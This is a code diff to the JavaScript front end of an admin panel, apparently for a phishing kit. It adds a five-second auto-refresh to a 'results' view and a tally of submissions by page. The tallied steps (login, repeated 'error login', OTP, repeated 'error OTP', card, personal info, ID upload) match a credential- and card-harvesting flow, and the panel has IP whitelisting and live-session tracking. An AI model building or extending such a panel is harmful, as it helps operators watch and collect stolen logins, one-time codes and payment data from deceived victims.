@@ -117,6 +117,10 @@ let draggedScreenName = null;
 let apiLoadError = "";
 const appearanceStorageKey = "deuceAppearance";
 let appBusyTimer = null;
+const resultsAutoRefreshMs = 5000;
+let resultsAutoRefreshTimer = null;
+let resultsAutoRefreshSlug = "";
+let resultsAutoRefreshBusy = false;
 
 function setAppBusy(isBusy, label = "Working") {
   window.clearTimeout(appBusyTimer);
@@ -248,8 +252,43 @@ function getPageBySlug(pageSlug) {
   return ownedPages.find((item) => item.slug === pageSlug || item.id === pageSlug) || null;
 }
 
+function isResultsRoute(pageSlug = "") {
+  const hash = window.location.hash || "";
+  return hash.startsWith("#results-") && (!pageSlug || hash.replace("#results-", "") === pageSlug);
+}
+
+function stopResultsAutoRefresh() {
+  if (resultsAutoRefreshTimer) {
+    window.clearInterval(resultsAutoRefreshTimer);
+  }
+  resultsAutoRefreshTimer = null;
+  resultsAutoRefreshSlug = "";
+  resultsAutoRefreshBusy = false;
+}
+
+function startResultsAutoRefresh(pageSlug) {
+  if (!pageSlug || !isResultsRoute(pageSlug)) return;
+  if (resultsAutoRefreshTimer && resultsAutoRefreshSlug === pageSlug) return;
+  stopResultsAutoRefresh();
+  resultsAutoRefreshSlug = pageSlug;
+  resultsAutoRefreshTimer = window.setInterval(async () => {
+    if (resultsAutoRefreshBusy) return;
+    if (!isResultsRoute(pageSlug)) {
+      stopResultsAutoRefresh();
+      return;
+    }
+    resultsAutoRefreshBusy = true;
+    try {
+      await renderResultsCenter(pageSlug, { autoRefresh: true });
+    } finally {
+      resultsAutoRefreshBusy = false;
+    }
+  }, resultsAutoRefreshMs);
+}
+
 function renderMissingPage() {
   activeFlowSlug = null;
+  stopResultsAutoRefresh();
   preview.innerHTML = `
     <section class="app-view">
       <div class="view-heading">
@@ -610,6 +649,68 @@ function resultSessions(results = []) {
       results: session.results.sort((a, b) => resultTimestampValue(a) - resultTimestampValue(b))
     }))
     .sort((a, b) => resultTimestampValue({ createdAt: b.lastSeen }) - resultTimestampValue({ createdAt: a.lastSeen }));
+}
+
+const resultStepDefinitions = [
+  ["login", "Login submitted"],
+  ["login2", "Error login submitted"],
+  ["otp", "OTP submitted"],
+  ["otp2", "Error OTP submitted"],
+  ["email", "Email submitted"],
+  ["personal", "Personal info submitted"],
+  ["card", "Card submitted"],
+  ["upload", "Upload submitted"],
+  ["thanks", "Thank you submitted"],
+  ["other", "Other submitted"]
+];
+
+function resultStepKey(result = {}) {
+  const value = normalizeFlowLabel([
+    result.screen,
+    result.pageId,
+    result.path,
+    result.file
+  ].filter(Boolean).join(" "));
+  if (value.includes("login2")) return "login2";
+  if (value.includes("otp2")) return "otp2";
+  if (value.includes("login") || value.includes("index")) return "login";
+  if (value.includes("otp")) return "otp";
+  if (value.includes("email")) return "email";
+  if (value.includes("personal")) return "personal";
+  if (value.includes("card")) return "card";
+  if (value.includes("upload")) return "upload";
+  if (value.includes("thanks") || value.includes("success")) return "thanks";
+  return "other";
+}
+
+function resultStepCounts(results = []) {
+  const counts = Object.fromEntries(resultStepDefinitions.map(([key]) => [key, 0]));
+  results.forEach((result) => {
+    counts[resultStepKey(result)] = (counts[resultStepKey(result)] || 0) + 1;
+  });
+  return counts;
+}
+
+function resultStepCountMarkup(results = []) {
+  const counts = resultStepCounts(results);
+  return `
+    <article class="security-panel result-count-panel">
+      <div class="builder-heading">
+        <div>
+          <small>result count</small>
+          <h3>Submissions by page</h3>
+        </div>
+      </div>
+      <div class="result-count-grid">
+        ${resultStepDefinitions.map(([key, label]) => `
+          <div class="${counts[key] ? "has-results" : ""}">
+            <span>${escapeHtml(label)}</span>
+            <b>${String(counts[key] || 0).padStart(2, "0")}</b>
+          </div>
+        `).join("")}
+      </div>
+    </article>
+  `;
 }
 
 function resultFieldMarkup(fields = {}) {
@@ -4024,14 +4125,17 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
   topbarTitle.textContent = `${page.name} Security`;
 }
 
-async function renderResultsCenter(pageSlug = "page-a") {
+async function renderResultsCenter(pageSlug = "page-a", options = {}) {
   activeFlowSlug = null;
   const page = getPageBySlug(pageSlug);
   if (!page) {
     renderMissingPage();
     return;
   }
+  const previousSearch = options.autoRefresh ? preview.querySelector("[data-session-search-input]")?.value || "" : "";
+  const previousFilter = options.autoRefresh ? preview.querySelector("[data-session-filter-button].is-active")?.dataset.sessionFilterButton || "all" : "all";
   await loadResultsControlData(page);
+  if (options.autoRefresh && !isResultsRoute(page.slug)) return;
   const results = page.results || [];
   const savedSessions = resultSessions(results);
   const activeSessions = page.activeSessions || [];
@@ -4074,6 +4178,8 @@ async function renderResultsCenter(pageSlug = "page-a") {
         <article><small>Whitelisted</small><b>${String(whitelistIps.length).padStart(2, "0")}</b><span>Trusted list</span></article>
       </div>
 
+      ${resultStepCountMarkup(results)}
+
       <article class="security-panel compact-results-center">
         <div class="builder-heading">
           <div>
@@ -4081,6 +4187,7 @@ async function renderResultsCenter(pageSlug = "page-a") {
             <h3>Compact sessions</h3>
           </div>
           <div class="compact-center-actions">
+            <span class="live-refresh-indicator" aria-live="polite">Auto-refresh 5s</span>
             <button type="button" data-refresh-results="${page.slug}">Refresh</button>
             <button type="button" data-route="#security-${page.slug}:traffic">Open traffic</button>
           </div>
@@ -4127,7 +4234,21 @@ async function renderResultsCenter(pageSlug = "page-a") {
     </section>
   `;
 
-  statusText.textContent = `${page.name.toUpperCase()} RESULTS READY`;
+  if (previousSearch) {
+    const searchInput = preview.querySelector("[data-session-search-input]");
+    if (searchInput) searchInput.value = previousSearch;
+  }
+  if (previousFilter !== "all") {
+    preview.querySelectorAll("[data-session-filter-button]").forEach((button) => {
+      button.classList.toggle("is-active", button.dataset.sessionFilterButton === previousFilter);
+    });
+    applyCompactSessionFilters();
+  } else if (previousSearch) {
+    applyCompactSessionFilters();
+  }
+
+  startResultsAutoRefresh(page.slug);
+  statusText.textContent = options.autoRefresh ? `${page.name.toUpperCase()} RESULTS AUTO-REFRESHED` : `${page.name.toUpperCase()} RESULTS READY`;
   topbarTitle.textContent = `${page.name} Results`;
 }
 
@@ -4281,6 +4402,7 @@ function renderRoute() {
   const publicRoutes = ["#login", "#signup"];
   syncAdminVisibility();
   clearAppBusySoon();
+  if (!hash.startsWith("#results-")) stopResultsAutoRefresh();
 
   if (!isLoggedIn() && !publicRoutes.includes(hash)) {
     setActiveNav("#dashboard");
